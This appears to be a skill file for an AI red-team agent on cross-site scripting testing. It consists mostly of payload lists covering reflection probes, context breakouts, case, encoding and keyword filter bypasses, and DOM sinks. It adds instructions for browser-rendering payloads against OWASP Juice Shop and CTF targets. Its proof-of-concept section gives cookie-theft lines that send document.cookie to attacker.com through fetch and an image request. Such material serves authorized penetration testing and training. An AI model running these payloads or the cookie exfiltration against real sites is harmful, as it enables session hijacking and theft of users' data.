---
name: xss-testing
description: Detect and exploit cross-site scripting vulnerabilities in web applications
origin: RedteamOpencode
---

# XSS Testing

## When to Activate

- User input reflected in responses (search, errors, profiles)
- DOM manipulation from URL fragments, query params, postMessage
- Rich text editors, comment systems, stored user content

## Types

| Type | Persistence |
|------|-------------|
| Reflected | None — requires victim click |
| Stored | Persistent — triggers on page view |
| DOM-based | Client-side JS processes input unsafely |

## Detection

### 1. Probe for Reflection
```
xss<test>"'`;(){}          # Canary to find reflection points
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```
For each param: submit canary, search entire HTML source, note every location, determine context.

### 2. Context Analysis

| Context | Example | Breakout |
|---------|---------|----------|
| HTML body | `<p>INPUT</p>` | Inject tags directly |
| Attribute | `value="INPUT"` | Close attr, add event handler |
| JS string | `var x = "INPUT"` | Close string, inject code |
| JS template | `` `${INPUT}` `` | `${alert(1)}` |
| URL/href | `href="INPUT"` | `javascript:alert(1)` |
| HTML comment | `<!-- INPUT -->` | `--><script>alert(1)</script>` |

## Context-Specific Payloads

### HTML Body
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
```

### Attribute
```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
"><script>alert(1)</script>
```

### JavaScript
```javascript
";alert(1)//    ';alert(1)//    \';alert(1)//
-alert(1)-      ${alert(document.domain)}
```

### URL/href
```
javascript:alert(document.domain)
```

## Filter Bypass

### Tag/Keyword Blocked
```html
<ScRiPt>alert(1)</sCrIpT>                    # Case variation
<img src=x onerror=alert(1)>                  # Alt tags if <script> blocked
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
```

### Encoding Bypasses
```
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;  # HTML entity
%3Cscript%3Ealert(1)%3C%2Fscript%3E              # URL encoding
%253Cscript%253Ealert(1)%253C%252Fscript%253E     # Double URL encoding
\u0061lert(1)                                      # Unicode escape (JS)
```

### Keyword Bypass
```html
confirm(1)  prompt(1)  eval('al'+'ert(1)')  setTimeout('alert(1)',0)
window['alert'](1)  [].constructor.constructor('alert(1)')()
alert`1`            # Backtick call
onerror=alert;throw 1  # Parentheses bypass
```

### CSP Bypass Indicators
Check header for: unsafe-inline, unsafe-eval, wildcard sources, JSONP endpoints, CDN with user content.

## DOM-Based XSS

Sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, `localStorage`
Sinks: `innerHTML`, `document.write`, `eval`, `setTimeout`, `element.src/href`, `jQuery.html()/$()`

```
https://target.com/page#<img src=x onerror=alert(1)>
targetWindow.postMessage('<img src=x onerror=alert(1)>','*')
```

### CTF / Juice Shop recall contract

When the target is a local CTF benchmark or the bundle/routes identify OWASP Juice Shop, do not close XSS-capable surfaces with API-only probes. Execute one bounded browser-flow pass for the canonical client-side challenge triggers, then check `/api/Challenges` or the Score Board for solved-state evidence before marking the case done.

Minimum browser-flow payload set:
- DOM XSS / Missing Encoding / Bonus Payload: render the search route with URL/hash payloads such as `/#/search?q=<iframe src="javascript:alert(1)">`, `/#/search?q=<img src=x onerror=alert(1)>`, and the encoded equivalents that exercise Angular route/query decoding.
- Reflected/API-only XSS: probe `/rest/products/search?q=<payload>` and then render the search results page that consumes the response; do not stop at a raw JSON reflection check.
- Stored/user-content XSS: after feedback/comment/upload filename writes, navigate to the exact consumer view that renders the stored value and look for execution or safe escaping.
- Zero Stars feedback: include the client/API path that submits a `0` rating and verify whether the challenge tracker flips even if the UI normally hides zero-star selection.

If any of those route/payload families has not been browser-rendered, return `REQUEUE` with a concrete `dynamic_render` or `form` follow-up instead of `DONE STAGE=exhausted`. This protects recall for DOM XSS, API-only XSS, Missing Encoding, Bonus Payload, Reflected XSS, and Zero Stars classes that API-only triage otherwise misses.

## Proof of Concept (demonstrate real impact)
```javascript
alert(document.domain)                                    // Execution context
fetch('https://attacker.com/log?c='+document.cookie)      // Cookie theft
new Image().src='https://attacker.com/steal?c='+document.cookie  // Session hijack
```

## Stored XSS Checklist

1. Test all persisted input fields (profiles, comments, messages, file names)
2. Navigate to every page where stored data displays
3. Test file upload names: `"><img src=x onerror=alert(1)>.jpg`
4. Test metadata: EXIF data, document properties
